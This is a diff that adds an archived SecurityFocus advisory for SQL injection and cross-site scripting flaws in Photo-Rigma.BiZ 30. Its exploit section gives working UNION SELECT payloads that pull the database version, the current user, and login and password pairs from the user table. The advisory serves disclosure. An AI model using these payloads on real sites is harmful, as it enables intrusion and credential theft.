@@ -1,0 +1,96 @@
+#SpeeDr00t@Black Falcon<br>#bid34709<p><b><span style="font-size: 18pt;">Photo-Rigma.BiZ SQL Injection and Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/34709/info">info</a><br><a href="http://www.securityfocus.com/bid/34709/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/34709/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/34709/solution">solution</a><br><a href="http://www.securityfocus.com/bid/34709/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				34709
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 24 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 27 2009 06:36PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				YEnH4ckEr
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Gold Rigma Photo-Rigma.BiZ  30<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x35000/34709/34709.txt">#exploit_34709.txt</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues via a browser. To exploit a cross-site scripting issue, the attacker must entice an unsuspecting victim to follow a malicious URI.<br/><br/>The following example URI is available:<br/><br/>http://www.example.com/HOME_PATH/?action=login&amp;amp;subact=profile&amp;amp;uid=1+AND+0+UNION+ALL+SELECT+1,2,3,version(),database(),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24/*<br/><br/>The following example data is available for the 'Search' field SQL-injection issue:<br/><br/>%' AND 0 UNION ALL SELECT 1,2,3,user(),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#<br/>%' AND 0 UNION ALL SELECT 1,2,3,concat(login,'&amp;lt;&amp;lt;::&amp;gt;&amp;gt;',password),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24 FROM user WHERE id=1#<br/><br/>The following example data is available for the 'Search' field cross-site scripting issue:
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/34709.txt">/data/vulnerabilities/exploits/34709.txt</a></li>
+</ul>
+</div>
